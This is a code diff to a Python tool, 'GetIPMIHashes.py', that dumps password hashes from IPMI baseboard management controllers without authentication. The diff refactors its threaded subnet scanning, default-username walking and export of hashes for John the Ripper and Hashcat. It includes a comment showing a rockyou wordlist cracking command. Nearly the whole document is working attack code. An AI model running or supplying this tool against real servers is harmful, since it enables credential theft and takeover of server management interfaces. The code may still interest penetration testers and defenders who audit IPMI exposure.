@@ -1,6 +1,6 @@
-#! /usr/bin/env python3
+#! /usr/bin/python3
 '''
-	Copyright 2020 Photubias(c)
+	Copyright 2024 Photubias(c)
 
         This program is free software: you can redistribute it and/or modify
         it under the terms of the GNU General Public License as published by
@@ -18,12 +18,12 @@
         This should work on Linux & Windows using Python2
         
         File name GetIPMIHashes.py
-        written by tijl[dot]deneut[at]howest[dot]be
+        written by Phobuties
 
         --- IPMI Unauthenticated Hash Dumper ---
         Walks through most known default usernames to retrieve hashes
 '''
-import socket, binascii, os, struct, argparse, sys, time
+import socket, binascii, os, struct, argparse, sys
 from multiprocessing.dummy import Pool as ThreadPool
 from itertools import repeat
 
@@ -60,11 +60,7 @@ def getIPs(cidr):
             b += '00000000'
             outQuads -= 1
         return b
-    def bin2ip(b):
-        ip = ''
-        for i in range(0,len(b),8):
-            ip += str(int(b[i:i+8],2)) + '.'
-        return ip[:-1]
+
     def dec2bin(n,d=None):
         s = ''
         while n>0:
@@ -75,16 +71,24 @@ def getIPs(cidr):
             while len(s)<d: s = '0' + s
         if s == '': s = '0'
         return s
+
+    def bin2ip(b):
+        ip = ''
+        for i in range(0,len(b),8): ip += str(int(b[i:i+8],2)) + '.'
+        return ip[:-1]
+
     iplist=[]
-    parts = cidr.split("/")
+    parts = cidr.split('/')
+    if len(parts) == 1:
+        iplist.append(parts[0])
+        return iplist
     baseIP = ip2bin(parts[0])
     subnet = int(parts[1])
     if subnet == 32:
         iplist.append(bin2ip(baseIP))
     else:
         ipPrefix = baseIP[:-(32-subnet)]
-        for i in range(2**(32-subnet)):
-            iplist.append(bin2ip(ipPrefix+dec2bin(i, (32-subnet))))
+        for i in range(2**(32-subnet)): iplist.append(bin2ip(ipPrefix+dec2bin(i, (32-subnet))))
     return iplist
 
 def testIP(dIP, dPort, iTimeout):
@@ -102,7 +106,7 @@ def testIP(dIP, dPort, iTimeout):
     if sResponse1 == '': return False
     return True
 
-def attemptRetrieve(sUser, dIP, dPort, iTimeout, bVerbose, bOutput, bScan):
+def attemptRetrieve(sUser, dIP, dPort, iTimeout, bVerbose, bOutput):
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
     sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
@@ -144,6 +148,7 @@ def attemptRetrieve(sUser, dIP, dPort, iTimeout, bVerbose, bOutput, bScan):
     iMessageLength = int(sResponse2[28:30],16)
     if iMessageLength == 8:
         if bVerbose: print('[-] User \'' + sUser + '\' does not seem to be a valid user on this system')
+        return False
     else:
         print('[+] Got hash for user \'' + sUser + '\' (' + dIP + ')')
         try:
@@ -168,7 +173,7 @@ def attemptRetrieve(sUser, dIP, dPort, iTimeout, bVerbose, bOutput, bScan):
             print(dIP + ' ' + sUser + ':' + '$rakp$' + sHashString.replace(':','$'))
             print('[+] Hash (Hashcat format):')
             print(sHashString)
-            if bOutput or bScan:
+            if bOutput:
                 ## john RAKP-HASH-John.txt --wordlist=/usr/share/wordlists/rockyou.txt
                 f = open('RAKP-HASH-John.txt', 'a+')
                 f.write(dIP + ' ' + sUser + ':' + '$rakp$' + sHashString.replace(':','$') + '\n')
@@ -183,70 +188,67 @@ def attemptRetrieve(sUser, dIP, dPort, iTimeout, bVerbose, bOutput, bScan):
             return False
     if bVerbose: print('[*] --------\n')
     sock.close()
+    return True
 
 def walkThroughUsers(args):
-    arrUsers = args[0]; dIP = args[1]; dPort = args[2]; iTimeout = args[3]; bVerbose = args[4]; bOutput = args[5]; bScan = args[6];
-    if testIP(dIP, dPort, iTimeout): print('[+] IP ' + dIP + ' has RMCP+ running.')
+    (lstUsers, dIP, dPort, iTimeout, boolVerbose, boolOutput, boolScan) = args
+    if testIP(dIP, dPort, iTimeout): print(f'[+] RCMP+ reachable for IP {dIP}')
     else:
-        if not bScan: print('[-] IP ' + dIP + ' has no RMCP+ running.')
+        if not boolScan or boolVerbose: print(f'[-] RCMP+ not reachable for IP {dIP}')
         return
-    for user in arrUsers:
-        if bVerbose: print('[*] Trying user: \'' + user + '\' (' + dIP + ')')
-        attemptRetrieve(user, dIP, dPort, iTimeout, bVerbose, bOutput, bScan)
+    for sUser in lstUsers:
+        if boolVerbose: print('[*] Trying user: \'{}\' ({})'.format(sUser, dIP))
+        if attemptRetrieve(sUser, dIP, dPort, iTimeout, boolVerbose, boolOutput):
+            return
 
 def main():
     ## Global variables, change at will
-    arrUsers = ['admin','root','ADMIN','Admin','Administrator','USERID','guest','vmware','ups']
-    dIP = '192.168.1.1'
+    lstUsers = ['admin','root','ADMIN','Admin','Administrator','USERID','guest','vmware','ups']
+    lstIPs = []
     dPort = 623
     iTimeout = 3
     bVerbose = False
     bOutput = False
     bScan = False
     ## Banner
-    #os.system('cls' if os.name == 'nt' else 'clear')
-    print("""
+    print('''
     [*****************************************************************************]
-                          --- IPMI Hash Dumper ---
-    This script will try multiple users and without authentication dump hashes.
-    Just run it without arguments, or provide arguments of your choice
-    ______________________/-> Created By Tijl Deneut(c) <-\_______________________
+                            --- IPMI Hash Dumper ---
+      This script will try multiple users and dump hashes without authentication.
+             Just run with an IP or subnet or filename as the target.
+                             For Hashcat, use mode 7300
+    _______________________/-> Created By Tijl Deneut(c) <-\_______________________
     [*****************************************************************************]
-    """)
+    ''')
     ## Defaults and parsing arguments
     parser = argparse.ArgumentParser()
-    parser.add_argument('-t', '--target', help="TARGET mode, provide IP address", default='')
-    parser.add_argument('-s', '--scan', help="SCAN mode, provide subnet (ignores target)", default='')
-    parser.add_argument('-p', '--port', help="Target UDP Port, default 623", default=623, type=int)
-    parser.add_argument('-v', '--verbose', help="Verbosity; more info", action="store_true")
-    parser.add_argument('-l', '--list', help="Custom list of usernames. E.g. '/usr/share/metasploit-framework/data/wordlists/ipmi_users.txt'", default='')
-    parser.add_argument('-o', '--output', help="Create output files for John & Hashcat, default on when scanning", action='store_true')
+    parser.add_argument('-p', '--port', help='Target UDP Port, default 623', default=623, type=int)
+    parser.add_argument('-l', '--list', help='Custom list of usernames. E.g. \'/usr/share/metasploit-framework/data/wordlists/ipmi_users.txt\'', default='')
+    parser.add_argument('-o', '--output', help='Create output files for John & Hashcat', action='store_true')
+    parser.add_argument('-v', '--verbose', help='Verbosity; more info', action='store_true')
+    parser.add_argument('target', help='Single ADDRESS, entire SUBNET or file containing one for each line')
     args = parser.parse_args()
-    if args.target == '' and args.scan == '': dIP = input('Please enter target IP address [192.168.1.1]: ')
-    elif not args.target == '': dIP = args.target
     dPort = args.port
     if args.verbose == 1: bVerbose = True
     if args.output == 1: bOutput = True
     if not args.list == '':
-        f = open(args.list,"r")
-        arrUsers = []
-        for user in f.readlines():
-            arrUsers.append(user.replace('\r','').replace('\n',''))
-        f.close()
-
-    if not args.scan == '':
-        arrIPs = getIPs(args.scan)
-        bScan = True
-        print('[*] Starting threads ...')
-        pool = ThreadPool(64)
-        pool.map(walkThroughUsers, zip(repeat(arrUsers), arrIPs, repeat(dPort), repeat(iTimeout), repeat(bVerbose), repeat(bOutput), repeat(bScan)))
-        ## -> This is for running non-multi-threaded
-        #for dIP in arrIPs:
-            #walkThroughUsers(arrUsers, dIP, dPort, iTimeout, bVerbose, bOutput, bScan)
-    else:
-        if not walkThroughUsers((arrUsers, dIP, dPort, iTimeout, bVerbose, bOutput, bScan)): exit(1)
-    if len(sys.argv) == 1:
-        raw_input('Press [Enter] key to exit')
+        lstUsers = []
+        for user in open(args.list,'r').read().splitlines():
+            lstUsers.append(user)
+    if os.path.isfile(args.target):
+        print('[+] Parsing file {} for IP addresses/networks.'.format(args.target))
+        for sLine in open(args.target, 'r').read().splitlines():
+            for sIP in getIPs(sLine):
+                lstIPs.append(sIP)
+    else: 
+        lstIPs = getIPs(args.target)
+    print('[!] Scanning {} addresses using up to {} threads.'.format(len(lstIPs), 64))
+    if len(lstIPs) > 1: bScan = True
+    pool = ThreadPool(64)
+    pool.map(walkThroughUsers, zip(repeat(lstUsers), lstIPs, repeat(dPort), repeat(iTimeout), repeat(bVerbose), repeat(bOutput), repeat(bScan)))
+    ## -> This is for running non-multi-threaded
+    #for dIP in lstIPs:
+        #walkThroughUsers(lstUsers, dIP, dPort, iTimeout, bVerbose, bOutput, bScan)
     exit(0)
 
 if __name__ == '__main__':
